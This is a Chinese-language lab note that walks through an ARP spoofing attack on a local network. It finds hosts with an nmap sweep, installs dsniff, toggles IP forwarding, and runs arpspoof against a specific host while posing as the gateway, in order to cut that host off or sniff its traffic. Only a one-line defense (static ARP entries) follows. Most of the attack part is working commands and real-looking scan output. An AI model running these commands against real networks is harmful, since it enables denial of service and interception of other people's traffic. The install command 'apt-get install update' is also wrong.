> [!bug] 实验目的
> 使用ARP 欺骗技术
> 断开局域网内的任意一台设备的网络

### 获取局域网内被攻击设备的 IP

```sh
# 查看当前设备所在网段
ifconfig
```

### 输出结果

```sh
┌──(root㉿YASLant)-[~]
└─# ifconfig
eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.58.9  netmask 255.255.255.0  broadcast 192.168.58.255
        inet6 2001:da8:7026:58:5aad:304:df60:3049  prefixlen 64  scopeid 0x0<global>
        inet6 2001:da8:7026:1b::3d9  prefixlen 128  scopeid 0x0<global>
        inet6 fe80::42b6:c875:8774:78f6  prefixlen 64  scopeid 0x20<link>
        inet6 2001:da8:7026:58:415:ba62:3da2:b9f8  prefixlen 128  scopeid 0x0<global>
        ether 08:8f:c3:6e:c0:83  txqueuelen 1000  (Ethernet)
        RX packets 89  bytes 5668 (5.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 14563  bytes 836850 (817.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2025  bytes 86809 (84.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2025  bytes 86809 (84.7 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

loopback0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        ether 00:15:5d:09:67:9f  txqueuelen 1000  (Ethernet)
        RX packets 47475  bytes 68070738 (64.9 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 13979  bytes 758408 (740.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

┌──(root㉿YASLant)-[~]
└─#
```

> [!important] 请确保已经安装了 NMAP 和 DSNIFF

### 安装 NAMP

```sh
# 更新软件源
apt-get install update

# 安装 NMAP
apt install nmap

# 安装DSNIFF
apt install dsniff
```

### Nmap 扫描同网段内所有的设备

```sh
# 扫描当前网段内所有设备
nmap 192.168.58.0-255
```

### 输出结果
```sh
┌──(root㉿YASLant)-[~]
└─# nmap 192.168.58.0-255
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 15:37 CST
Nmap scan report for 192.168.58.1
Host is up (0.00097s latency).
All 1000 scanned ports on 192.168.58.1 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
MAC Address: 34:58:40:6B:1C:0E (Huawei Technologies)

Nmap scan report for 192.168.58.20
Host is up (0.00075s latency).
All 1000 scanned ports on 192.168.58.20 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
MAC Address: DC:D8:7C:5F:1C:1E (Beijing Jingdong Century Trading)

Nmap scan report for 192.168.58.50
Host is up (0.0011s latency).
All 1000 scanned ports on 192.168.58.50 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
MAC Address: 60:18:95:2D:92:23 (Dell)

Nmap scan report for 192.168.58.72
Host is up (0.00074s latency).
All 1000 scanned ports on 192.168.58.72 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
MAC Address: 34:64:A9:34:BD:25 (Hewlett Packard)

Nmap scan report for 192.168.58.99
Host is up (0.0012s latency).
All 1000 scanned ports on 192.168.58.99 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
MAC Address: 58:11:22:82:02:97 (ASUSTek Computer)

Nmap scan report for 192.168.58.177
Host is up (0.00093s latency).
All 1000 scanned ports on 192.168.58.177 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
MAC Address: 98:8F:E0:66:CB:07 (Huaqin Technology)

Nmap scan report for 192.168.58.182
Host is up (0.0018s latency).
All 1000 scanned ports on 192.168.58.182 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
MAC Address: 60:18:95:3A:39:C4 (Dell)

Nmap scan report for 192.168.58.9
Host is up (0.0000040s latency).
All 1000 scanned ports on 192.168.58.9 are in ignored states.
Not shown: 1000 closed tcp ports (reset)

Nmap done: 256 IP addresses (8 hosts up) scanned in 157.00 seconds

┌──(root㉿YASLant)-[~]
└─#
```

### 中断对方网络 OR 劫取数据 (嗅探目标主机网络数据包)

```sh
# 0 不保存数据  会使得目标断网
# 1 保存数据  IP转发，网络数据包流经中间人设备，被攻击设备正常上网（用于劫取数据）
echo 1 > /proc/sys/net/ipv4/ip_forward
```

```sh
 arpspoof -i eth1 -t 192.168.58.182 192.168.58.1
```

```text
这个命令是用于执行ARP欺骗攻击的。具体来说，它的含义如下：

arpspoof 是一个工具，用于发送伪造的ARP响应，从而欺骗目标主机。
-i eth1 指定要使用的网络接口，这里是 `eth1`。
-t 192.168.58.182 指定目标主机的IP地址，即要欺骗的主机。
192.168.58.1 是伪造的ARP响应中指定的目标IP地址，这里是网关的IP地址，通常用于将流量重定向到攻击者控制的主机上。

这个命令的目的是将目标主机（192.168.58.182）的流量重定向到攻击者控制的主机（可能是执行该命令的主机）。
```

### 使用 WiseShark 获取被攻击电脑的数据包

### 防御措施

> [!error] 防御措施
> Arp 欺骗本质在于修改了受害机的 arp 表，那么我们直接在 arp 中把网关的 ip 与 mac地址写死（也就是改为静态）那么就可以免遭 arp 攻击的"毒手"
